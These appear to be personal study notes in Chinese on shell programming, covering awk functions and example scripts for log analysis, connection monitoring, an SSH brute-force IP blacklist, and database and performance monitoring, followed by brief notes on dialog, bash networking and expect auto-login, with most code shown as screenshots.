![image-20220330191947959](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330191947959.png)

![image-20220330192003210](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192003210.png)

![image-20220330192015921](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192015921.png)

3）内置字符串函数

length（[s]）函数可以统计字符串s的长度，如果不指定字符串s则统计$0的长度。

![image-20220330192220015](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192220015.png)

![image-20220330192243467](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192243467.png)

![image-20220330192308670](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192308670.png)

![image-20220330192338083](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192338083.png)

index（字符串1，字符串2）函数返回字符串2在字符串1中的位置坐标。

![image-20220330192805501](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330192805501.png)

![image-20220330193107346](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330193107346.png)

match（s, r）函数根据正则表达式r返回其在字符串s中的位置坐标。

![image-20220330193214221](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330193214221.png)

tolower（str）函数可以将字符串转换为小写。

![image-20220330193704969](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330193704969.png)

toupper（str）函数可以将字符串转换为大写。

![image-20220330193934793](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330193934793.png)

split（字符串，数组，分隔符）函数可以将字串按特定的分隔符切片后存储在数组中，如果没有指定分隔符，则使用FS定义的分隔符进行字符串切割。

![image-20220330194151132](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330194151132.png)

这条命令以空格或Tab键为分隔符，将hello the world切割为独立的三个部分，分别存入test[1]、test[2]、test[3]数组中，最后通过print指令可以按照任意顺序打印显示这些数组元素的值。

![image-20220330194510814](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330194510814.png)

![image-20220330194650817](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330194650817.png)

gsub（r, s, [, t]）函数可以将字符串t中所有与正则表达式r匹配的字符串全部替换为s，如果没有指定字符串t，默认对$0进行替换操作。

![image-20220330194826111](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330194826111.png)

![image-20220330194856904](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330194856904.png)

sub（r, s, [, t]）函数与gsub类似，但仅替换第一个匹配的字符串，而不是替换全部。

![image-20220330194918454](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330194918454.png)

substr（s, i[, n]）函数可以对字符串s进行截取，从第i位开始，截取n个字符串，如果n没有指定则一直截取到字符串s的末尾位置。

![image-20220330195017033](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330195017033.png)

4）内置时间函数

systemtime（）返回当前时间距离1970-01-0100:00:00有多少秒。

![image-20220330195247255](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330195247255.png)

5）用户自定义函数

awk用户自定义函数格式如下。

![image-20220330195507389](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330195507389.png)

上面的命令首先定义了一个名称为myfun的函数，函数体内只有一条指令，就是打印输出hello。因为是在BEGIN{}中调用的myfun函数，所以该函数仅被执行一次。

![image-20220330195616966](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330195616966.png)

上面这个示例定义了一个可以接受传递参数（简称传参）的函数，定义函数时还定义了两个形式参数x和y（简称形参）。在调用函数时再输入实际参数（简称实参）,max（18,9）中的18和9就是实参，按照前后顺序，awk会在调用执行函数时将18赋值给变量x，将9赋值给变量y。这样我们就可以将对比最大值或其他类似的功能写成一个函数，这种函数可以反复被调用，每次调用都可以传递不同的参数，对比不一样的数字大小。我们也可以设计一些功能更加强大的函数，这个就需要根据实际的应用环境灵活应变了。

### 7.5 实战案例：awk版网站日志分析

在前面的4.3节中我们已经编写了一个日志分析脚本，但是因为没有sed和awk这样的工具，所以在过滤和处理数据方面使用了一些非常规手段，虽然也可以实现我们需要的效果，但是当我们掌握了sed和awk工具后，这里就有必要重写该脚本了，让脚本更加简洁、直观和高效。

例如，上一版脚本中读取日志文件的某一列数据，我们使用的是在while循环中通过read读取多列数据，如果一个文件有几十列，这是无法容忍的。但是，如果通过awk重写该功能，我们就可以直接精准地获取特定的数据列，并对其进行后续的分析。

另外，在做一些统计工作时，上一版脚本普遍都在循环中定义关联数组，然后通过对数组元素值的累加进行统计。而使用awk的数组重写这些代码会让脚本更简洁、执行效率更高。

如何使用awk统计访问次数呢？首先我们需要分析日志文件的数据结构，如果是统计每个用户的访问次数，则我们需要关心的就是日志文件的第1列；如果要统计每个页面被访问的次数，就需要关心文件的第7列；如果需要统计HTTP状态码的次数，就需要关心文件的第9列数据。因为每台主机的日志文件具体内容都不尽相同，这里我们查看某一台主机的日志文件内容作为后面命令的数据范本。

![image-20220330203446597](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330203446597.png)

了解了源文件的内容结构后，如何对特定的数据进行统计并计数呢？前面我们学习过awk支持数组和算术运算，使用这些就够了！

![image-20220330203839493](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330203839493.png)

上面这条神奇的命令已经将每个IP的访问次数统计完了！如何实现的？我们来分析一下其处理流程，因为放在花括号{}中的动作指令隐含着循环，所以日志文件有多少行，上面这个IP[$1]++就会被重复执行多少次。

● awk读取日志文件的第1行，定义关联数组，数组名称为IP，使用该行第1列数据作为数组的索引下标（即172.40.58.114），而IP['172.40.58.114']++则是对该数组元素进行自加一运算，因为默认该数组元素的值为0[插图]，所以自加一后的值为1，也可以理解为172.40.58.114的访问次数为1次。

● 接着，继续读取第2行数据，定义关联数组，数组名称为IP，使用该行第1列数据作为数组的索引下标（即172.40.58.212），继续执行IP['172.40.58.212']++，因为该数组元素也是未定义直接调用的，进行自加一运算后为1，代表172.40.58.212访问服务器的次数为1。

● 继续读取第3行数据，定义关联数组，数组名称为IP，使用该行第1列数据作为数组的索引下标（即172.40.58.48），继续执行IP['172.40.58.48']++，进行自加一运算后也是1，代表172.40.58.48访问服务器的次数为1。

● 继续读取第4行数据，定义关联数组，数组名称为IP，使用该行第1列数据作为数组的索引下标（即172.40.58.212），继续执行IP['172.40.58.212']++，因为该数组元素前面已经定义且赋值为1，所以这里进行自加一运算后，其值变成了2，代表172.40.58.212访问服务器的次数为2。

● 依此类推，就可以将所有客户端的访问次数都统计处理，数组的索引就是客户端的IP地址，数组元素的值就是访问次数。

虽然仅使用上面的命令已经可以统计每个用户的访问次数了，但是，如果有一万个客户端IP的访问记录，也就代表有一万个数组元素，如何最终将结果显示出来呢？这就需要在所有数据文件都读取完毕后，通过一个循环批量将数组元素的值显示出来。

![image-20220330204356369](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330204356369.png)

上面的输出结果中第1列是客户端的IP地址，第2列是该客户端IP的访问次数。

同样的道理，我们也可以统计HTTP各种状态码的个数，我们先输出次数，再输出HTTP状态码

![image-20220330205542866](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330205542866.png)

![image-20220330205813214](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330205813214.png)

结合条件匹配我们还可以分析特定时间段内的日志数据，比如统计10:00至10:30的日志数据。

![image-20220330210325996](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330210325996.png)

上面的命令首先通过-F定义数据字段的分隔符为冒号、空格或斜线，因此第7列和第8列就对应的是小时和分钟，通过将$7:$8与指定的时间进行对比即可过滤有个时间段内的日志数据。如果是以冒号和空格为分隔符呢？那么我们需要提取的就是第5列和第6列数据。

下面是重写后的网站日志分析脚本。

![image-20220330222701585](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330222701585.png)

![image-20220330222721772](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330222721772.png)

![image-20220330222737022](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330222737022.png)

### 7.6 实战案例：监控网络连接状态

部署在Linux服务器上的业务一般都是支持高并发连接的服务，如HTTP、FTP、DNS等服务都可以提供成百上千的并发连接数。虽然日志文件可以为我们提供历史数据，但是如果想了解服务器实时的网络连接状态呢？从CentOS7开始系统默认包含了ss这个工具，它可以实现类似netstat的功能，但是比netstat更高效，也可以显示更多有关网络连接状态的信息。但是要想监控网络连接状态，熟悉TCP与UDP是必要的前提条件。

首先，我们需要学习的是UDP, UDP（User DatagramProtocol）的中文名称是用户数据报协议，属于OSI参考模型的4层（传输层）协议，它是一种非面向连接的协议，使用UDP通信时，发送数据方不需要与接收数据方建立连接，不需要经对方的同意，甚至不需要确认对方是否存在，就可以随时将数据直接传输给对方，因为不需要烦琐的三次握手，所以其通信效率非常高。但是，UDP报文没有可靠性保证、顺序保证和流量控制字段等，因此数据通信的可靠性较差。不可靠是不是就没人使用了呢？当然不是，有些应用在数据丢失后是可以重传的，而且有些软件即使在丢失少量数据包的情况下也不影响业务的正常使用。目前基于UDP的服务主要有DNS（域名解析系统）、DHCP（动态主机配置协议）、TFPT（简单文件传输协议）、SNMP（简单网络管理协议）等。

其次，还需要学习TCP的相关知识，TCP（TransmissionControl Protocol）的中文名称是传输控制协议，属于OSI参考模式的4层（传输层）协议，是一种面向连接的协议，使用TCP通信前，发送数据方与接收数据方必须先通过三次握手建立连接才可以发送数据，通信结束后，还需要进行四次断开。像我们打电话一样，通话前必须先拨号，与对方建立一个连接通道，连接通道建立后才可以通话，彼此传递信息，通话结束后需要挂断电话。图7-5为TCP的三次握手流程及其对应的状态

![image-20220330232753375](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330232753375.png)

 TCP的三次握手流程及其对应的状态

![image-20220330232809703](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330232809703.png)

TCP的四次断开流程及其对应的状态

可以看出，建立连接前服务器需要先启动服务，让服务处于LISTEN监听状态，随时接收用户的连接请求。当有客户端需要与服务器建立连接时，客户端就需要发送一个SYN请求包给服务器，请求建立连接，此时客户端处于SYN_SENT状态，服务器处于SYN_RCVD状态。服务器在接收到客户端的请求后会给客户端发送一个SYN/ACK的回应包，客户端收到该回应后确定可以与服务器建立连接，最后客户端再给服务器发送一个ACK的确认包，双方都进入了ESTABLISHED状态（已连接状态），到此握手完毕。

单工模式的网卡在某一时刻仅可以有一端发送数据，另一端则只能接收而不能发送数据。全双工模式的网卡可以在客户端与服务器之间双向同时传递数据，而目前的网卡都支持全双工模式，因此在断开TCP连接时需要客户端和服务器各发送一次断开请求。首先，客户端通过发送FIN数据包请求断开连接，此时客户端处于FIN_WAIT1状态（等待断开），服务器处于CLOSE_WAIT状态，接着服务器会发送给客户端一个ACK的确认包，此时客户端会处于FIN_WAIT2状态，这样客户端后续就不会再给服务器发送任何有效数据，但是服务器却依然可以给客户端传递未完成的数据。等服务器将所有数据都传递完成后，服务器会向客户端发送断开请求FIN，此时服务器处于LAST_ACK状态（最后确认状态），客户端则处于TIME_WAIT状态，客户端接收到服务器发来的FIN包后，客户端会再次给服务器发送一个断开的ACK确认包，最终双方的连接断开，而CLOSED并不是一种真正的状态。

对于服务器的维护人员来说，监控这些服务的实时状态、统计实时并发量、分析客户端IP都是非常重要且必须完成的任务。使用ss命令可以实时查看网络连接状态，借助于awk我们还可以非常轻松地过滤并分析这些数据。

ss命令语法格式如下。

![image-20220330233046031](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330233046031.png)

ss命令常用选项及其功能描述

![image-20220330233058337](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220330233058337.png)

![image-20220331141148346](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331141148346.png)

输出结果包含4列，分别对应的是连接状态、接收和发送的队列长度（对于ESTAB而言是未复制和未得到客户端确认的数据字节数）、服务本地监听的IP与端口信息及最后输出的远程主机的IP与端口信息。

从输出结果中可以看出，有些服务仅处于LISTEN监听的状态，并没有任何客户端连接该服务（如mysql、http等服务），而有些服务处于ESTAB状态，表示有客户端已经与服务器建立完成了TCP握手连接（如ssh服务）。

在HTTP应用中，存在一个问题，SERVER由于某种原因关闭连接，如KEEPALIVE的超时，这样，作为主动关闭的SERVER一方就会进入 FIN_WAIT2状态，但TCP/IP协议栈有个问题，FIN_WAIT2状态是没有超时的（不象TIME_WAIT状态），所以如果CLIENT不关闭，这个FIN_WAIT_2状态将保持到系统重新启动，越来越多的FIN_WAIT_2状态会致使内核crash。 出现fin_wait_2一般为客户端，如果为服务端出现，则表明是服务端主动发起的断开。

recv-Q 表示网络接收[队列](https://so.csdn.net/so/search?q=队列&spm=1001.2101.3001.7020)
表示收到的数据已经在本地接收缓冲，但是还有多少没有被进程取走，recv()
如果接收队列Recv-Q一直处于阻塞状态，可能是遭受了拒绝服务 denial-of-service 攻击。

send-Q 表示网路发送队列
对方没有收到的数据或者说没有Ack的,还是本地缓冲区.
如果发送队列Send-Q不能很快的清零，可能是有应用向外发送数据包过快，或者是对方接收数据包不够快。

这两个值通常应该为0，如果不为0可能是有问题的。packets在两个队列里都不应该有堆积状态。可接受短暂的非0情况。

![img](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C20171214152607931)

\1. time_wait状态如何产生？ 

1）为实现TCP全双工连接的可靠释放

2）为使旧的数据包在网络因过期而消失

详见

https://blog.csdn.net/huangyimo/article/details/81505558

![image-20220331142804226](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331142804226.png)

![image-20220331142926777](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331142926777.png)

![image-20220331143005783](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331143005783.png)

![image-20220331143228276](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331143228276.png)

![image-20220331143310211](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331143310211.png)

![image-20220331143611875](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331143611875.png)

![image-20220331143656048](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331143656048.png)

对于ss命令的输出结果，我们还需要使用awk等工具进行过滤和统计分析工作，下面我们来编写一个监控网络连接状态的脚本。

![image-20220331173450842](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331173450842.png)

![image-20220331173505019](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331173505019.png)

![image-20220331173515690](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331173515690.png)

![image-20220331173523071](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331173523071.png)

![image-20220331174654000](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331174654000.png)

### 7.7 实战案例：获取SSH暴力破解攻击黑名单列表

SSH是Secure Shell的简称，是一种可以用来加密连接服务器的标准协议，使用SSH远程管理服务器，可以有效防止信息泄露，目前几乎所有类UNIX服务器都会支持该协议。

虽然SSH属于加密连接，但是如果攻击者使用暴力破解的方式破解远程密码，服务器中的数据依然有被盗取的危险，特别是在使用弱密码的情况下更是如此。暴力破解是攻击者使用密码字典中的密码逐一枚举，分别尝试每个密码是否可以登录服务器，如果字典中的密码足够多，并且不限制时间，理论上一定是可以破解成功的。

作为管理员，我们需要识别这种攻击并能够拦截。CentOS系统中有一个独立的登录日志文件/var/log/secure，该文件中记录了系统的登录日志。某些其他的Linux系统该日志文件的名称也可能是/var/log/auth.log。

如果使用SSH远程登录服务器时密码错误，日志文件中就会包含如下的记录信息，说明在5月8日15:29:05这个时间，有一台IP地址为192.168.2.12的主机使用37370端口连接本机的SSH（22）端口，远程连接使用的账户名称为root，但是连接时密码错误。

![image-20220331175321926](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331175321926.png)

如果使用SSH远程登录服务器时账户名错误，日志文件就会包含如下的记录信息，说明在5月8日15:34:00这个时间，有一台IP地址为192.168.2.12的主机使用37372端口连接本机的SSH（22）端口，远程时使用的是无效的账户名称test。

![image-20220331175341919](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331175341919.png)

如果使用SSH远程登录服务器时成功，日志文件就会包含如下的记录信息，说明在5月8日15:41:24这个时间，有一台IP地址为192.168.2.11的主机使用38562端口连接本机的SSH端口，登录账户名称为root，密码校验成功。

![image-20220331175446617](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331175446617.png)

了解了这些日志内容后，就可以编写脚本过滤异常登录的信息，并提取远程IP地址，然后将提取的IP地址写入黑名单，禁止该IP地址再次攻击服务器。编写脚本时我们可以创建3个函数，分别判断最近1分钟、5分钟、15分钟的日志内容，查看是否能异常记录，如果相同的异常记录超过3次，则提取产生该异常的IP地址并将其写入黑名单，最终可以根据黑名单文件编写防火墙策略，禁止该IP的再次攻击。像银行的密码系统一样，如果我们输入错误密码大于N次之后，当天账户会被锁定，但是第二天又可以继续测试密码。针对远程登录也是同样的道理，针对失败次数大于等于3次的IP地址，我们可能只需要禁用该IP特定的时间，比如20分钟，这样我们就需要再编写一个函数，用来清理黑名单中时间大于20分钟的IP地址。

![image-20220331213249929](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331213249929.png)

![image-20220331213300895](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331213300895.png)

![image-20220331213310710](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331213310710.png)

![image-20220331213322854](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331213322854.png)

![image-20220331213333986](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331213333986.png)

![image-20220331213344888](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220331213344888.png)

该脚本最终仅生成黑名单文件，如果需要拒绝黑名单IP地址的访问，还可以编写脚本读取黑名单文件并结合iptables防火墙规则，即可实现拒绝特定的IP访问本机。

### 7.8 实战案例：性能监控脚本

2.6节已经编写过一个性能监控脚本，在学习完awk工具后我们准备再次重写该脚本，优化其功能和性能。在脚本中为了让代码更整洁，在必要的地方会使用\转义字符强制将一条比较长的命令分割为多行命令。

![image-20220402000635950](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402000635950.png)

![image-20220402000656015](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402000656015.png)

![image-20220402001353395](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402001353395.png)

### 7.9 实战案例：数据库监控脚本

企业的很多决策都需要依赖于数据的支撑，对于海量的数据而言，高效、稳定地管理好这些数据就需要一款优秀的数据库管理软件，CentOS系统中默认提供的数据库管理软件有MariaDB、PostgreSQL和SQLite。其中MariaDB是MySQL的一个分支产品，安全兼容MySQL数据库。目前在互联网企业中比较流行的数据库解决方案都是采用MySQL或基于MySQL分支的产品方案，有些企业为了提升数据读写的性能还会引入一些NoSQL的产品，如Memcached、Redis和MongoDB等数据库软件。

既然数据库软件是企业业务的核心，实时监控数据库的可用性、稳定性及性能也就变成了同样重要的一项工作，而这种监控工作使用脚本自动化完成再合适不过。

对于MySQL或者MariaDB而言，如果我们需要监控其服务的可用性，可通过mysqladmin工具的ping子命令实现监控。该命令有三个非常重要的参数-u、-p和-h, -u用来指定访问数据库的用户名称，-p用来指定范围数据库的密码，在空密码时可以不使用-p参数，-h可用指定需要监控的数据库服务器主机，可用使用IP地址或主机名称。ping返回信息"alive"说明数据库可用正常连接，返回"Can't connectto local MySQL server"说明数据库服务器无法连接。

![image-20220402152946740](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402152946740.png)

其他的没有提供类似mysqldmin工具的数据库软件我们还可用ps、ss等命令检查服务是否可用。

通过mysqladmin工具的processlist子命令可用查看所有数据库连接线程列表，可用查询什么账户从哪台主机正在连接数据库服务器、正在使用的数据库名称是什么、该账户正在执行的SQL指令是什么等信息。

通过mysqladmin工具的processlist子命令可用查看所有数据库连接线程列表，可用查询什么账户从哪台主机正在连接数据库服务器、正在使用的数据库名称是什么、该账户正在执行的SQL指令是什么等信息。

![image-20220402153157512](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402153157512.png)

使用mysql命令的-e选项可以非交互式地执行各种SQL指令。通过执行SQL指令可以对数据库进行基本的增、删、改、查等操作，还可以查询数据库的各种性能参数。

show databases指令可以查询所有的数据库名称列表。

![image-20220402153244249](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402153244249.png)

MySQL或MariaDB维护着大量的环境变量，我们可以通过配置文件或命令修改这些变量的值，使用show variables指令可以查看数据库管理系统的各种变量及值。

show variables like 'max_connections’可以在所有的变量中查找max_connections变量及其值，查看数据库的最大并发连接数。

![image-20220402153429589](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402153429589.png)

show variables like 'max_user_connections’可以在所有变量中查找max_user_connections变量及其值，查看每个用户的最大并发连接数。

![image-20220402153458505](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402153458505.png)

show variables like指令支持使用通配符进行模糊匹配，查看所有与connections有关的参数。

![image-20220402153603764](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402153603764.png)

除show variables外，我们还可以使用show status查看MySQL或MariaDB数据库系统的实时状态信息，showvariables查看的数据可以通过set指令修改变量的值，而show status查询的值无法修改。

show status like 'Threads_connected’可以查看当前实时客户端连接数。

![image-20220402153648583](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402153648583.png)

show status like 'Max_used_connections’可以查看曾经的最大客户端连接数。.

![image-20220402154059580](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154059580.png)

show status like 'com_select’可以查看select指令被执行的次数。

![image-20220402154124192](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154124192.png)

show status like 'com_insert’可以查看insert指令被执行的次数。

![image-20220402154413153](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154413153.png)

show status like 'com_update’可以查看update指令被执行的次数。

![image-20220402154427425](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154427425.png)

show status like 'com_delete’可以查看delete指令被执行的次数。

![image-20220402154439721](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154439721.png)

show status like 'slow_queries’可以查看数据库慢查询的数量。

![image-20220402154449368](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154449368.png)

show global status like 'Questions’可以查看服务器执行的总指令数，不包括存储过程

![image-20220402154643453](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154643453.png)

Show global status like 'uptime’可以查看数据库软件启动的时间。

![image-20220402154759407](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154759407.png)

Show global status like 'Com_commit’可以查看数据库执行commit指令的次数。

![image-20220402154814995](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154814995.png)

Show global status like 'Com_rollback’可以查看数据库执行rollbak指令的次数。

![image-20220402154831553](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154831553.png)

数据库还有两个重要的性能指标：QPS和TPS。QPS（Query Per Second）是指每秒查询量，TPS（Transaction Per Second）是指每秒事务量。

QPS=总指令量/uptime, QPS=Questions/uptime。

TPS=（事务commit+事务rollback）/uptime,TPS=（Com_commit+Com_rollback）/uptime。

下面我们需要结合awk等工具编写一个完整的数据库监控脚本。

![image-20220402154948014](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402154948014.png)

![image-20220402155003556](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402155003556.png)

![image-20220402155027450](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402155027450.png)

![image-20220402155037689](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402155037689.png)

### 7.10 实战案例：awk版网络爬虫

6.9节介绍了如何使用sed实现网络爬虫的功能，在学习完本章后你会发现其实使用awk在互联网中过滤数据会更简单、简洁。

这里我们再次重写网络爬虫脚本，这次我们使用awk过滤自己需要的数据，代码可以更简洁。

![image-20220402162513823](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220402162513823.png)

3月16号开始\0402结束

接下来的都是我补充的shell编程辅助手册，不做重点解释。

## 第八章 文字与图形接口编程

### 1.dialog文本接口编程

dialog可以显示文本接口程序一个软件 

需要下载 kali自带

dialog --msgbox 信息内容  高度 宽度

```
dialog --msgbox "20220403" 10 40
```

![image-20220403200246366](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403200246366.png)

窗口按钮只有一个，若使用者按下enter键，窗口便结束，离去状态为0，若按下ESC键窗口状态也会结束，离去状态为255，可用$?来检查

```
--backtitle #出在背景顶部的标题
--title #出现在对话框顶部的标题
--no-shadow #外框不要有阴影的效果
```

```
$?的值为0，表示选是，为1表示选否，为255表示选ESC键
```

```
[--colors]    解读嵌入式“\ Z”的对话框中的特殊文本序列，序列由下面的字符 0-7, b  B, u, U等，恢复正常的设置使用“\Zn”。
[--no-shadow]   禁止阴影出现在每个对话框的底部
[--shadow]   应该是出现阴影效果[--insecure]   输入部件的密码时，明文显示不安全，使用星号来代表每个字符[--no-cancel]   设置在输入框，菜单，和复选框中，不显示“cancel”项
[--clear]   完成清屏操作。在框体显示结束后，清除框体。这个参数只能单独使用，不能和别的参数联合使用。
[--ok-label <str>]   覆盖使用“OK”按钮的标签，换做其他字符。
[--cancel-label <str>]  功能同上
[--backtitle <backtitle>] 指定的backtitle字符串显示在背景顶端。
[--begin <y> <x>]   指定对话框左上角在屏幕的上的做坐标
[--timeout <secs>]   超时（返回的错误代码），如果用户在指定的时间内没有给出相应动作，就按超时处理
[--defaultno]   使的是默认值 yes/no，使用no
[--sleep <secs>]
[--stderr]  以标准错误方式输出
[--stdout]  以标准方式输出
[--default-item <str>]  设置在一份清单，表格或菜单中的默认项目。通常在框中的第一项是默认
窗体类型：

常见的对话框控件选项有：
[ --calendar ]     提供了一个日历，让你可以选择日期
[ --checklist ]    允许你显示一个选项列表，每个选项都可以被单独的选择  (复选框)
[ --from ]           允许您建立一个带标签的文本字段，并要求填写
[ --fselect ]    提供一个路径，让你选择浏览的文件
[ --gauge ]    显示一个表，呈现出完成的百分比，就是显示出进度。
[ --infobox ]     显示消息后，（没有等待响应）对话框立刻返回，但不清除屏幕  (信息框)
[ --inputbox ]   让用户输入文本  (输入框  )
[ --inputmenu ]    提供一个可供用户编辑的菜单  （可编辑的菜单框）
[ --menu ]       显示一个列表供用户选择   (菜单框)
[ --msgbox ]   显示一条消息，并要求用户选择一个确定按钮  (消息框  )
[ --pause ]      显示一个表格用来显示一个指定的暂停期的状态
[ --passwordbox ]    显示一个输入框，它隐藏文本
[ --passwordfrom ]  显示一个来源于标签并且隐藏的文本字段
[ --radiolist ]      提供一个菜单项目组，只有一个项目，可以选择  (单选框 )
[ --tailbox ]        在一个滚动窗口文件中使用tail命令来显示文本
[ --tailboxbg]     跟tailbox类似，但是在background模式下操作
[ --textbox ]       在带有滚动条的文本框中显示文件的内容  (文本框)
[ --timebox ]      提供一个窗口，选择小时，分钟，秒
[ --yesno ]     提供一个带有yes和no按钮的简单信息框  (是/否框)
```



### 2.xdialog图形接口编程

没找到这个东西   在vue的弹框ios穿透框架中有相关内容

## 第九章 bash网络编程

### 1.bash网络转向

就是利用网络，然后012转向

就是反弹shell那些里面会有

### 2.远程执行命令

就是利用了ssh。需要用的时候可参考

https://www.cnblogs.com/bandaoyu/p/15573651.html

### 3.expect与自动登录

这个就结合软件SecureCRT里面的自动登录功能。

[SecureCRT](https://so.csdn.net/so/search?q=SecureCRT&spm=1001.2101.3001.7020)是一款支持SSH（SSH1和SSH2）、Telnet、串口等的终端仿真程序，简单地说是Windows下登录UNIX或Linux服务器主机的软件。在我们今后接下来的学习或工作中会经常使用它远程登录到Linux系统上去工作

用过SecureCRT的肯定都知道里面的自动登录功能，如下图：

![image-20220403205522168](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403205522168.png)

当勾选“自动登陆”时，下面的“预期”及“发送”，就可以编辑了，预期就是字符终端输出什么样的字符时，我们的SecureCRT捕获到这个输出时，立刻发送相应的字符输入。

![image-20220403205537081](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403205537081.png)

![image-20220403205547267](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220403205547267.png)

